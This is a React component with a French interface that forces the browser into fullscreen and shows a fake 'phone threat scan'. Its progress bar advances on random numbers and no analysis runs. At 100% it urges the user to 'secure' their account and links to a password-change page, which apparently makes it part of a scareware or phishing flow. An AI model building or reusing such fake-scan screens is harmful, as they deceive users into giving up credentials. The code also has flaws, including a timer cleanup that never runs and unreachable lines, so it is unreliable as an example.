import React, { Component } from 'react'
import { ReactComponent as SecureLogo } from '../../img/svg/account.svg'
import Typography from '@material-ui/core/Typography';
import { makeStyles, Grid, Button } from '@material-ui/core'
import LinearProgress from '@material-ui/core/LinearProgress';
import CloudUploadIcon from '@material-ui/icons/CloudUpload';
import LockOutlinedIcon from '@material-ui/icons/LockOutlined';
import { Link } from 'react-router-dom'
import Fullscreen from "react-full-screen";
import Header from '../Header';

class Analyse extends Component {

  constructor(props) {
    super();

    this.state = {
      isFull: false,
      completed: 0,
    };
  }






  action = (oldCompleted) => {
    if (oldCompleted === 100) {

      return 100;
    }
    const diff = Math.random() * 10;
    return Math.min(oldCompleted + diff, 100);
  }

  progress = () => {
    this.setState(({ a, completed }, props) => {
      return {

        completed: this.action(completed)
      }

    })
  }



  goFull = () => {
    this.setState({ isFull: true });
  }
  exitFull = ()=>{
   this.setState({isFull: false})
   
  }
  componentDidMount() {
    this.goFull()
    const timer = setInterval(this.progress, 500);
    return () => {
      clearInterval(timer);
    };
    this.goFull()
  }





  render() {
    return (







      <Fullscreen
        enabled={this.state.isFull}
        onChange={isFull => this.setState({ isFull })}
      >
        <Header />
        <div className="full-screenable-node">



          <Grid
            container
            direction="column"
            justify="center"
            alignItems="center"
            style={{ marginTop: '50px' }}
          >

            <Grid item style={{ width: '50%' }}>

              <SecureLogo />
            </Grid>
            <Grid item style={{ width: '50%', textAlign: 'center' }}>
              <h3>Analyse de votre téléphone pour enlever toute ménace</h3>
              <LinearProgress variant="determinate" value={this.state.completed} />
              <p>{Math.round(this.state.completed)}%</p>
            </Grid>

            {

              Math.round(this.state.completed) == 100 && (<Grid item style={{ width: '50%', textAlign: 'center' }}>
                <p>Vuillez Sécuriser votre compte</p>
              
                  <Button
                    variant="contained"
                    color="primary"
                
                    href="/modif-password"
                    startIcon={<LockOutlinedIcon />}
                  >
                    Suivant
                </Button>
          
              </Grid>)

            }
          </Grid>



 

        </div>
      </Fullscreen>










    )
  }
}

export default Analyse
